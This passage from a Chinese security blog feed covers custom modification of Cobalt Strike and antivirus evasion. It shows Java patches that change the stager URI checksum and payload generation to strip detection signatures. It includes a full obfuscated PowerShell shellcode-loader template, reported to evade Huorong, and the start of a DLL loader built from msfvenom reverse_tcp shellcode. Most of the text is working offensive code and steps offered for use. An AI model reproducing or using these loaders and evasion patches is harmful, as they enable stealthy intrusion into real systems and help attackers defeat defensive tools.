class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">byte</span>[] _buildPowerShellNoHint(<span class="type">byte</span>[] var1, String var2) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">   <span class="type">InputStream</span> <span class="variable">var3</span> <span class="operator">=</span> CommonUtils.resource(<span class="string">&quot;resources/template.&quot;</span> + var2 + <span class="string">&quot;.ps1&quot;</span>);</span><br><span class="line">   <span class="type">byte</span>[] var4 = CommonUtils.readAll(var3);</span><br><span class="line">   var3.close();</span><br><span class="line">   <span class="type">String</span> <span class="variable">var5</span> <span class="operator">=</span> CommonUtils.bString(var4);</span><br><span class="line">   <span class="type">byte</span>[] var6 = <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;<span class="number">35</span>&#125;;</span><br><span class="line">   var1 = CommonUtils.XorString(var1, var6);</span><br><span class="line">   var5 = CommonUtils.strrep(var5, <span class="string">&quot;%%TEST%%&quot;</span>, Base64.encode(Base64.encode(var1)));</span><br><span class="line">   <span class="keyword">return</span> CommonUtils.toBytes(var5);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由%%DATA%%改为%%TEST%%在加一个base64<br>修改完成后编译<br>修改模板文件\decompiled_src\resources\template.x86.ps1</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-StrictMode</span> <span class="literal">-Version</span> <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$x1</span>=<span class="string">&#x27;ZnVuY3Rpb24gZnVuY19nZXRfcHJvY19hZGRyZXNzIHsNCglQYXJhbSAoJHZhcl9tb2R1bGUsICR2YXJfcHJvY2VkdXJlKQkJDQoJJHZhcl91bnNhZmVfbmF0aXZlX21ldGhvZHMgPSAoW0FwcERvbWFpbl06OkN1cnJlbnREb21haW4uR2V0QXNzZW1ibGllcygpIHwgV2hlcmUtT2JqZWN0IHsgJF8uR2xvYmFsQXNzZW1ibHlDYWNoZSAtQW5kICRfLkxvY2F0aW9uLlNwbGl0KCdcXCcpWy0xXS5FcXVhbHMoJ1N5c3RlbS5kbGwnKSB9KS5HZXRUeXBlKCdNaWNyb3NvZnQuV2luMzIuVW5zYWZlTmF0aXZlTWV0aG9kcycpDQoJJHZhcl9ncGEgPSAkdmFyX3Vuc2FmZV9uYXRpdmVfbWV0aG9kcy5HZXRNZXRob2QoJ0dldFByb2NBZGRyZXNzJywgW1R5cGVbXV0gQCgnU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkhhbmRsZVJlZicsICdzdHJpbmcnKSkNCglyZXR1cm4gJHZhcl9ncGEuSW52b2tlKCRudWxsLCBAKFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuSGFuZGxlUmVmXShOZXctT2JqZWN0IFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5IYW5kbGVSZWYoKE5ldy1PYmplY3QgSW50UHRyKSwgKCR2YXJfdW5zYWZlX25hdGl2ZV9tZXRob2RzLkdldE1ldGhvZCgnR2V0TW9kdWxlSGFuZGxlJykpLkludm9rZSgkbnVsbCwgQCgkdmFyX21vZHVsZSkpKSksICR2YXJfcHJvY2VkdXJlKSkNCn0NCg0KZnVuY3Rpb24gZnVuY19nZXRfZGVsZWdhdGVfdHlwZSB7DQoJUGFyYW0gKA0KCQlbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJFRydWUpXSBbVHlwZVtdXSAkdmFyX3BhcmFtZXRlcnMsDQoJCVtQYXJhbWV0ZXIoUG9zaXRpb24gPSAxKV0gW1R5cGVdICR2YXJfcmV0dXJuX3R5cGUgPSBbVm9pZF0NCgkpDQoNCgkkdmFyX3R5cGVfYnVpbGRlciA9IFtBcHBEb21haW5dOjpDdXJyZW50RG9tYWluLkRlZmluZUR5bmFtaWNBc3NlbWJseSgoTmV3LU9iamVjdCBTeXN0ZW0uUmVmbGVjdGlvbi5Bc3NlbWJseU5hbWUoJ1JlZmxlY3RlZERlbGVnYXRlJykpLCBbU3lzdGVtLlJlZmxlY3Rpb24uRW1pdC5Bc3NlbWJseUJ1aWxkZXJBY2Nlc3NdOjpSdW4pLkRlZmluZUR5bmFtaWNNb2R1bGUoJ0luTWVtb3J5TW9kdWxlJywgJGZhbHNlKS5EZWZpbmVUeXBlKCdNeURlbGVnYXRlVHlwZScsICdDbGFzcywgUHVibGljLCBTZWFsZWQsIEFuc2lDbGFzcywgQXV0b0NsYXNzJywgW1N5c3RlbS5NdWx0aWNhc3REZWxlZ2F0ZV0pDQoJJHZhcl90eXBlX2J1aWxkZXIuRGVmaW5lQ29uc3RydWN0b3IoJ1JUU3BlY2lhbE5hbWUsIEhpZGVCeVNpZywgUHVibGljJywgW1N5c3RlbS5SZWZsZWN0aW9uLkNhbGxpbmdDb252ZW50aW9uc106OlN0YW5kYXJkLCAkdmFyX3BhcmFtZXRlcnMpLlNldEltcGxlbWVudGF0aW9uRmxhZ3MoJ1J1bnRpbWUsIE1hbmFnZWQnKQ0KCSR2YXJfdHlwZV9idWlsZGVyLkRlZmluZU1ldGhvZCgnSW52b2tlJywgJ1B1YmxpYywgSGlkZUJ5U2lnLCBOZXdTbG90LCBWaXJ0dWFsJywgJHZhcl9yZXR1cm5fdHlwZSwgJHZhcl9wYXJhbWV0ZXJzKS5TZXRJbXBsZW1lbnRhdGlvbkZsYWdzKCdSdW50aW1lLCBNYW5hZ2VkJykNCg0KCXJldHVybiAkdmFyX3R5cGVfYnVpbGRlci5DcmVhdGVUeXBlKCkNCn0NCg0KW0J5dGVbXV0kdmFyX2NvZGUgPSBbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCc=&#x27;</span></span><br><span class="line"><span class="variable">$x2</span>=<span class="string">&#x27;%%TEST%%&#x27;</span></span><br><span class="line"><span class="variable">$x3</span>=<span class="string">&#x27;JykNCmZvciAoJHggPSAwOyAkeCAtbHQgJHZhcl9jb2RlLkNvdW50OyAkeCsrKSB7DQoJJHZhcl9jb2RlWyR4XSA9ICR2YXJfY29kZVskeF0gLWJ4b3IgMzUNCn0NCg0KJHZhcl92YSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKChmdW5jX2dldF9wcm9jX2FkZHJlc3Mga2VybmVsMzIuZGxsIFZpcnR1YWxBbGxvYyksIChmdW5jX2dldF9kZWxlZ2F0ZV90eXBlIEAoW0ludFB0cl0sIFtVSW50MzJdLCBbVUludDMyXSwgW1VJbnQzMl0pIChbSW50UHRyXSkpKQ0KJHZhcl9idWZmZXIgPSAkdmFyX3ZhLkludm9rZShbSW50UHRyXTo6WmVybywgJHZhcl9jb2RlLkxlbmd0aCwgMHgzMDAwLCAweDQwKQ0KW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6Q29weSgkdmFyX2NvZGUsIDAsICR2YXJfYnVmZmVyLCAkdmFyX2NvZGUubGVuZ3RoKQ0KDQokdmFyX3J1bm1lID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJHZhcl9idWZmZXIsIChmdW5jX2dldF9kZWxlZ2F0ZV90eXBlIEAoW0ludFB0cl0pIChbVm9pZF0pKSkNCiR2YXJfcnVubWUuSW52b2tlKFtJbnRQdHJdOjpaZXJvKQ==&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$xx1</span>=[<span class="type">System.Text.Encoding</span>]::UTF8.GetString([<span class="type">System.Convert</span>]::FromBase64String(<span class="variable">$x1</span>))</span><br><span class="line"><span class="variable">$xx2</span>=[<span class="type">System.Text.Encoding</span>]::UTF8.GetString([<span class="type">System.Convert</span>]::FromBase64String(<span class="variable">$x2</span>))</span><br><span class="line"><span class="variable">$xx3</span>=[<span class="type">System.Text.Encoding</span>]::UTF8.GetString([<span class="type">System.Convert</span>]::FromBase64String(<span class="variable">$x3</span>))</span><br><span class="line"><span class="variable">$xxx</span>=<span class="variable">$xx1</span>+<span class="variable">$xx2</span>+<span class="variable">$xx3</span></span><br><span class="line"><span class="keyword">If</span> ([<span class="built_in">Int</span><span class="type">Ptr</span>]::size <span class="operator">-eq</span> <span class="number">8</span>) &#123;</span><br><span class="line"><span class="built_in">start-job</span> &#123; <span class="keyword">param</span>(<span class="variable">$a</span>) IE`X <span class="variable">$a</span> &#125; <span class="literal">-RunAs32</span> <span class="literal">-Argument</span> <span class="variable">$xxx</span> | <span class="built_in">wait-job</span> | <span class="built_in">Receive-Job</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">I`EX <span class="variable">$xxx</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改完成后把模板文件template.x86.ps1,编译文件ResourceUtils.class进行替换具体方法见上篇<br>替换完成后继续替换服务端和客户端的jar包<br>测试<br><img src="/posts/2f863dad/image-20220904151103899.png" alt="image-20220904151103899"><br>生成正常<br><img src="/posts/2f863dad/image-20220904151048614.png" alt="image-20220904151048614"><br>可以免杀火绒<br><img src="/posts/2f863dad/image-20220904151317564.png" alt="image-20220904151317564"><br>上线正常<br>这是修改32位的payload,64位的思路差不多</p>]]></content>
      
      
      <categories>
          
          <category> CobaltStrike </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CobaltStrike </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CobaltStrike简单二开学习记录(上)</title>
      <link href="/posts/ac2ce454/"/>
      <url>/posts/ac2ce454/</url>
      
        <content type="html"><![CDATA[<h1 id="CobaltStrike简单二开学习记录-上"><a href="#CobaltStrike简单二开学习记录-上" class="headerlink" title="CobaltStrike简单二开学习记录(上)"></a>CobaltStrike简单二开学习记录(上)</h1><h2 id="环境搭建-CS反编译及导入IDEA编译"><a href="#环境搭建-CS反编译及导入IDEA编译" class="headerlink" title="环境搭建-CS反编译及导入IDEA编译"></a>环境搭建-CS反编译及导入IDEA编译</h2><blockquote><p>参考：<a href="https://github.com/zer0yu/Awesome-CobaltStrike">https://github.com/zer0yu/Awesome-CobaltStrike</a></p></blockquote><p>环境：IDEA JDK8&amp;11 </p><h3 id="1、反编译Jar包"><a href="#1、反编译Jar包" class="headerlink" title="1、反编译Jar包"></a>1、反编译Jar包</h3><p>利用IDEA自带反编译–不要用jd-gui</p><p>反编译：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp IDEA_HOME/plugins/java-decompiler/lib/java-decompiler.jar  org.jetbrains.java.decompiler.main.decompiler.ConsoleDecompiler -dgs=true &lt;src.jar&gt; &lt;dest dir&gt;</span><br></pre></td></tr></table></figure><p>具体命令：coba文件夹需要自己创建</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;D:\JDK11\bin\java.exe&quot; -cp &quot;D:\IntelliJ IDEA\plugins\java-decompiler\lib\java-decompiler.jar&quot; org.jetbrains.java.decompiler.main.decompiler.ConsoleDecompiler -dgs=true cobaltstrike.jar coba</span><br></pre></td></tr></table></figure><h3 id="2、新建Java项目"><a href="#2、新建Java项目" class="headerlink" title="2、新建Java项目"></a>2、新建Java项目</h3><p>完成后会在coba目录下生成一个cobaltstrike.jar文件<br>直接用解压缩文件进行解压<br>IDEA新建项目–项目目录下新建文件夹lib把原始的cobaltstrike.jar复制过去–再新建文件夹decompiled_src把刚才解压出来的文件放到该目录<br>项目配置:<br>第一步:文件–项目结构–模块–依赖–把lib目录下的cobaltstrike.jar添加进去–勾选然后确定<br>第二步:添加具有依赖项的模块–aggresss</p><p><img src="/posts/ac2ce454/image-20220902100035824.png" alt="image-20220902100035824"></p><p><img src="/posts/ac2ce454/image-20220902100527025.png" alt="image-20220902100527025"></p><p><img src="/posts/ac2ce454/image-20220902100458859.png" alt="image-20220902100458859"></p><h3 id="3、修改代码–测试"><a href="#3、修改代码–测试" class="headerlink" title="3、修改代码–测试"></a>3、修改代码–测试</h3><p>测试:将\decompiled_src\aggressor\Aggressor.java复制到\src\aggressor\Aggressor.java然后修改代码<br><img src="/posts/ac2ce454/image-20220902152720742.png" alt="image-20220902152720742"></p><p>插入代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JOptionPane.showMessageDialog(<span class="literal">null</span>,<span class="string">&quot;test&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="4、打包编译"><a href="#4、打包编译" class="headerlink" title="4、打包编译"></a>4、打包编译</h3><p>编译代码:构建–构建工件–构建<br>构建完成生成\out\artifacts\CS_jar\CS.jar</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar CS.jar</span><br></pre></td></tr></table></figure><p>成功弹窗<br><img src="/posts/ac2ce454/image-20220902152858456.png" alt="image-20220902152858456"></p><p>测试完成可以把src下的aggressor文件夹删掉了</p><h2 id="表面配置-对端口密码证书做特征消除"><a href="#表面配置-对端口密码证书做特征消除" class="headerlink" title="表面配置-对端口密码证书做特征消除"></a>表面配置-对端口密码证书做特征消除</h2><p>简单说下，较为简单，主要是源码的特征流量</p><ul><li><p>证书修改:cobaltstrike.beacon_keys和cobaltstrike.store不要使用默认的文件，删除</p></li><li><p>profile文件要换新的，启动服务端时记得加载，或直接把jar包里面的默认配置给改了</p></li><li><p>端口修改:开在公网的teamserver不要使用默认端口</p></li></ul><h2 id="逆向源码-对http-x2F-s上线流量做特征消除"><a href="#逆向源码-对http-x2F-s上线流量做特征消除" class="headerlink" title="逆向源码-对http&#x2F;s上线流量做特征消除"></a>逆向源码-对http&#x2F;s上线流量做特征消除</h2><p>CS生成一个http32位木马视图中开启web日志运行木马观察日志<br><img src="/posts/ac2ce454/image-20220902153858763.png" alt="image-20220902153858763"><br>发现访问了地址&#x2F;a7vN&#x2F; 再生成一个木马进行上线发现又变成了&#x2F;7lxA&#x2F;<br><img src="/posts/ac2ce454/image-20220902154139189.png" alt="image-20220902154139189"><br>该目录是根据一个checksum8算法来进行实现代码如下:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EchoTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">long</span> <span class="title function_">checksum8</span><span class="params">(String text)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (text.length() &lt; <span class="number">4</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0L</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        text = text.replace(<span class="string">&quot;/&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="type">long</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0L</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">0</span>; x &lt; text.length(); x++) &#123;</span><br><span class="line">            sum += text.charAt(x);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> sum % <span class="number">256</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(checksum8(<span class="string">&quot;a7vN&quot;</span>));<span class="comment">//替换为访问的地址eg：a7vN</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>两次访问的地址通过代码运行的结果均为:92<br>可以得出结论:只要是符合「checksum8」算法技术出来的文件都可以请求到<br>这里理一下思路:cs采用http上线,在未修改的cs上面后面的http请求url为4位字符串同样算法checksum8得到为92或93可以判定为cs连接器<br>想要消除特征可以通过修改该数字来达到<br>checksum8函数位置:\decompiled_src\cloudstrike\WebServer.java</p><p><img src="/posts/ac2ce454/image-20220902192553334.png" alt="image-20220902192553334"><br>可以看到32位为92 64位数为93<br>接下来进行特征消除<br>按照上文的修改方法把\decompiled_src\cloudstrike\WebServer.java复制到\src\cloudstrike\WebServer.java<br>把访问的地址改为固定值比如64位改为为tests对应的数字为51 32位数改为test对应的数字为192<br>修改代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isStager</span><span class="params">(String uri)</span> &#123;</span><br><span class="line">   <span class="keyword">return</span> checksum8(uri) == <span class="number">192L</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isStagerX64</span><span class="params">(String uri)</span> &#123;</span><br><span class="line">   <span class="keyword">return</span> checksum8(uri) == <span class="number">51L</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还需要修改判定代码\decompiled_src\common\CommonUtils.java复制到\src\common\CommonUtils.java<br>修改MSFURI和MSFURI_X64两个函数 将两个函数的返回值直接写死</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">MSFURI</span><span class="params">(<span class="type">int</span> var0)</span> &#123;</span><br><span class="line">   String[] var1 = toArray(<span class="string">&quot;a, b, c, d, e, f, h, i, j, k, l, m, n, o, p, q, r, s, t, u, v, w, x, y, z, A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P, Q, R, S, T, U, V, W, X, Y, Z, 1, 2, 3, 4, 5, 6, 7, 8, 9, 9&quot;</span>);</span><br><span class="line"></span><br><span class="line">   StringBuffer var2;</span><br><span class="line">   <span class="keyword">do</span> &#123;</span><br><span class="line">      var2 = <span class="keyword">new</span> <span class="title class_">StringBuffer</span>(var0 + <span class="number">1</span>);</span><br><span class="line">      var2.append(<span class="string">&quot;/&quot;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">var3</span> <span class="operator">=</span> <span class="number">0</span>; var3 &lt; var0; ++var3) &#123;</span><br><span class="line">         var2.append(pick(var1));</span><br><span class="line">      &#125;</span><br><span class="line">   &#125; <span class="keyword">while</span>(checksum8(var2.toString()) != <span class="number">92L</span>);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> <span class="string">&quot;test&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">MSFURI_X64</span><span class="params">()</span> &#123;</span><br><span class="line">   String[] var0 = toArray(<span class="string">&quot;a, b, c, d, e, f, h, i, j, k, l, m, n, o, p, q, r, s, t, u, v, w, x, y, z, A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P, Q, R, S, T, U, V, W, X, Y, Z, 1, 2, 3, 4, 5, 6, 7, 8, 9, 9&quot;</span>);</span><br><span class="line"></span><br><span class="line">   String var1;</span><br><span class="line">   <span class="keyword">do</span> &#123;</span><br><span class="line">      var1 = <span class="string">&quot;/&quot;</span> + pick(var0) + pick(var0) + pick(var0) + pick(var0);</span><br><span class="line">   &#125; <span class="keyword">while</span>(checksum8(var1) != <span class="number">93L</span>);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> <span class="string">&quot;tests&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来按照上文构建代码<br>产生三个报错<br><img src="/posts/ac2ce454/image-20220902200423883.png" alt="image-20220902200423883"><br>第一个报错–删掉int len$;<br>第二个报错–删掉String[]<br>第三个报错–删掉WebService service;<br>重新构建<br>将构建好的jar替换掉原包<br>或者<br>把修改的两个文件重新编译下:CommonUtils.java WebServer.java 构建–重新编译<br>把原包cobaltstrike.jar用解压缩文件打开两个文件编译好的class文件替换掉原有的class文件<br>两种方法那个可以成功就用那个 重点:客户端和服务端都要替换<br><img src="/posts/ac2ce454/image-20220902213022132.png" alt="image-20220902213022132"><br>地址成功修改为了test</p><h2 id="逆向源码-对http-x2F-s生成Payload做特征消除"><a href="#逆向源码-对http-x2F-s生成Payload做特征消除" class="headerlink" title="逆向源码-对http&#x2F;s生成Payload做特征消除"></a>逆向源码-对http&#x2F;s生成Payload做特征消除</h2><p>payload生成方式:<br>32位:BeaconHTTPStagerX86-&gt;GenericHTTPStagerX86-&gt;resources&#x2F;httpstager.bin<br>64位:BeaconHTTPStagerX86-&gt;GenericHTTPStagerX64-&gt;resources&#x2F;httpstager64.bin<br>思路:<br>用x86资源bin替换x64的，实现x64生成与x86一致 直接把httpstager.bin文件复制出来重命名为httpstager64.bin然后替换原来的httpstager64.bin<br>注意这里仅替换还不行因为资源文件改变读取方法也要改变还要更改代码GenericHTTPStagerX64.java代码改为</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">GenericHTTPStagerX86</span> <span class="keyword">extends</span> <span class="title class_">GenericHTTPStager</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="title function_">GenericHTTPStagerX86</span><span class="params">(ScListener var1)</span> &#123;</span><br><span class="line">      <span class="built_in">super</span>(var1);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getExitOffset</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">708</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getPortOffset</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">191</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getSkipOffset</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">736</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getFlagsOffset</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">211</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">public</span> String <span class="title function_">arch</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;x64&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">public</span> String <span class="title function_">getStagerFile</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;resources/httpstager64.bin&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改完成后重新编译方法与上文相同<br>大体思路:1、替换1n生即免杀  2、更改源码生成机制即晚杀</p><h2 id="逆向源码-对Powershell生成Payload做特征消除"><a href="#逆向源码-对Powershell生成Payload做特征消除" class="headerlink" title="逆向源码-对Powershell生成Payload做特征消除"></a>逆向源码-对Powershell生成Payload做特征消除</h2><p>CS生成的powershell shellcode都是通过模板生成免杀效果几乎为0<br>通过修改模板消除特征同时提高免杀效果<br>\decompiled_src\resources\template.x86.ps1即为32位shellcode模板文件可以看到shellcode通过<code>%%DATA%%</code>进行传递而<code>%%DATA%%</code>在\decompiled_src\common\ResourceUtils.java中的<code>_buildPowerShellNoHint</code>函数生成<br>到这里shellcode的生成逻辑也就知道了<br>可以通过修改生成逻辑–比如修改_buildPowerShellNoHint中的加密方式 </p><p>这需要很强的开发功底如果开发能力不强可以直接将免杀shellcode替换掉template.x86.ps1达到生成即免杀</p>]]></content>
      
      
      <categories>
          
          <category> CobaltStrike </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CobaltStrike </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DLL劫持与Syscall免杀初尝试</title>
      <link href="/posts/facab1e5/"/>
      <url>/posts/facab1e5/</url>
      
        <content type="html"><![CDATA[<h1 id="DLL劫持与Syscall免杀初尝试"><a href="#DLL劫持与Syscall免杀初尝试" class="headerlink" title="DLL劫持与Syscall免杀初尝试"></a>DLL劫持与Syscall免杀初尝试</h1><h2 id="DLL劫持"><a href="#DLL劫持" class="headerlink" title="DLL劫持"></a>DLL劫持</h2><h3 id="DLL劫持-语言-调用加载"><a href="#DLL劫持-语言-调用加载" class="headerlink" title="DLL劫持-语言-调用加载"></a>DLL劫持-语言-调用加载</h3><p>利用msf生产payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=ip lport=port -f c</span><br></pre></td></tr></table></figure><p>Visual Studio创建动态链接库(DLL)项目</p><p><img src="/posts/facab1e5/image-20220828230121536-16616988835951-16616988857353.png" alt="image-20220828230121536"></p><p>项目生成的dllmain.cpp,pch.cpp重命名为dllmain.c,pch.c </p><p><img src="/posts/facab1e5/image-20220828231531280.png" alt="image-20220828231531280"></p><p>dllmain.c代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker,<span class="string">&quot;/subsystem:\&quot;Windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>) </span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] =</span><br><span class="line"><span class="comment">//msf生产payload</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> main()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span>* Memory;</span><br><span class="line">    Memory = VirtualAlloc(<span class="literal">NULL</span>, <span class="keyword">sizeof</span>(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="built_in">memcpy</span>(Memory, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    ((<span class="type">void</span>(*)())Memory)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>选择release生成解决方案<br>利用python调用dll文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span 